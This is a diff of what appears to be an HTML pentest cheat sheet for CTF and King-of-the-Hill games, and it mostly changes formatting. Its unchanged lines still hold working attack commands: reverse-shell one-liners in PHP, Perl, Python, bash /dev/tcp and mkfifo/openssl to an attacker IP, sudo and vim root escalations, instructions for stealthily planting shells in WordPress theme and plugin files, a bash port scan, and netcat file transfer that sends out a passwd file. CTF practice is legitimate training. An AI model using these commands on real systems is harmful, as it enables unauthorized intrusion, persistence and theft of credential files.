@@ -85,9 +85,11 @@ I think remmina is slow, compared to xfreerdp.
 
 <h2>NETCAT</h2>
 
+
 <b>pform@attacker~: </b><code>nc -lnvp 5555</code>
 
 <h2>PWNCAT</h2>
+
 
 For more mer info on pwncat visit: <li>https://github.com/calebstewart/pwncat</li>
 
@@ -95,7 +97,7 @@ For more mer info on pwncat visit: <li>https://github.com/calebstewart/pwncat</l
 
 <code>pwncat -l -p 5555</code>
 
-  
+
 I prefer pwncat as you can just press<b>"CTRL+D"</b> and download and upload files like this:
 
 <b>hacked-account@victim ~/</b><code></code>
@@ -109,7 +111,6 @@ Press<b>"CTRL+D"</b>
 Then Press <b>"CTRL+D"</b> again to return to the reverse-shell.
 
 <b>hacked-account@victim ~/</b><code></code>
-
 
 
 <h1>Reverse-Shell</h1>
@@ -129,21 +130,26 @@ You have to do it like this if you run it in on a wordpress site
 
 <h2>PHP</h2>
 
+
 <code>php -r '$sock=fsockopen("10.10.10.10",5555);exec("/bin/sh -i <&3 >&3 2>&3");'</code>
 
 <h2>Perl</h2>
+
 
 <code>perl -e 'use Socket;$i="10.10.10.10";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</code>
   
 <h2>Python</h2>
 
+
 <code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code>
 
 <h2>mkfifo</h2>
 
+
 <code>mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.10.10:5555 > /tmp/s 2> /dev/null; rm /tmp/s</code>
 
 <h2>Java</h2>
+
 
 <code>r = Runtime.getRuntime()</code>
 
@@ -172,18 +178,19 @@ LinEnum <li>https://github.com/rebootuser/LinEnum</li>
 <b>hacked-account@victim~: </b><code>find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null</code>
 
 
+
+<h1>GTFObins</h1>
+
+
 GTFObins <li>https://gtfobins.github.io/</li>
 
-
-<h2>GTFObins</h2>
-
-bash
+<h1>bash</h1>
 
 <b>hacked-account@victim~: </b><code>sudo -u#-1 /bin/bash</code>
 
 <b>hacked-account@victim~: </b><code>sudo bash -p</code>
 
-vim 
+<b>vim</b>
 
 <b>hacked-account@victim~: </b><code>sudo vim</code> followed by <code>:!bash -p</code> ( -p flag make the progrom persist the root permision)
 
@@ -362,9 +369,8 @@ example 2.
 <h1>Get Reverse-Shell in Wordpress</h1>
 
 
-Wordpress example 1. - Using 404.php
+<h2>Wordpress example 1. - Using 404.php</h2>
 
-+-------------------+
 
 The best thing is to edit the 404.php file for the theme in use or another theme thats not in use, to be more stealth, 
 
@@ -377,9 +383,8 @@ as it dont hang the hole wordpress site, if you need to check the site for more 
 Then to load the reverse-shell just visit: http://10.10.20.20/wordpress/wp-content/themes/twentytwenty/404.php
 
 
-Wordpress example 2. - Using index.php
+<h2>Wordpress example 2. - Using index.php</h2>
 
-+-------------------+
 
 First you need so set up your listner:
 
@@ -395,17 +400,15 @@ get_header(); ?>
 
 <div class="wrap">
   
-Wordpress example 3. - Using Plugin Editor
+<h2>Wordpress example 3. - Using Plugin Editor</h2>
  
-+-------------------+
 
 After logging in to the admin panel open the Plugin editor, in the bottom of a plugin.
 
 Add <code>/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'</code>
 
- Wordpress example 4. - Using header.php
- 
-+-------------------+
+<h2>Wordpress example 4. - Using header.php</h2>
+  
 
 Edit "header.php"
 
@@ -422,9 +425,10 @@ open upp burp and run command in the bottom of the page:
 <code>cmd=/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1</code>
 
 
-<h2>Some random Tips and Tricks</h2>
+<h1Random Tips and Tricks</h1>
 
 <h2>SSH Tunneling</h2>
+
 
 Tunnel traffic over ssh to your attacker machine so you can act as the machine you have ssh in to.
 
@@ -442,6 +446,7 @@ And you can access the server running Jenkins as it was on your localnetwork.
 
 <h2>Change IP on all scripts in a folder</h2>
 
+
 If you like me have a folders with reverse-shells and scripts for your CTF / Koth needs,
 
 and your IP changes just before the game starts, and no script have the correct ip.
@@ -454,6 +459,7 @@ and your IP changes just before the game starts, and no script have the correct 
 
 <h2>Use Bash for portscan</h2>
 
+
 <b>(Use bash to portscan new host thats only accesible from victim machine, with no other portscanner in reach.)</b>
 
 <b>Open ports gives you back a "Done"</b>
@@ -462,13 +468,12 @@ and your IP changes just before the game starts, and no script have the correct 
 
 <b>hacked-account@victim ~/: <b/><code>for i in 79 80 81; do echo $i & bash -i >& /dev/tcp/10.10.20.20/$i 0>&1;done</code>
 
-<br><b>
 
 <h1>Transfer files</h1>
 
 
-
 <h2>WGET</h2>
+
 
 Run this in the folder you have the files you want to upload.
 
@@ -481,6 +486,7 @@ The use wget to download the file like this:
 <b>hacked-account@victim~: </b><code>wget 10.10.10.10:5555/super-privesc-0day.sh</code>
 
 <h2>CURL</h2>
+
 
 Run this in the folder you have the files you want to upload.
 
@@ -495,6 +501,7 @@ The use curl to download the file like this:
 
 <h2>With NETCAT</h2>
 
+
 On receiving end:
 
 <b>pform@attacker~: </b><code>nc -l 5555 > passwd</code>
@@ -506,6 +513,7 @@ On sending end:
 If you want to transfer from attacker to victim, just swich the commands.
 
 <h2>With PWNCAT</h2>
+
 
 I prefer pwncat as you can just press<b>"CTRL+D"</b> and download and upload files like this:
 
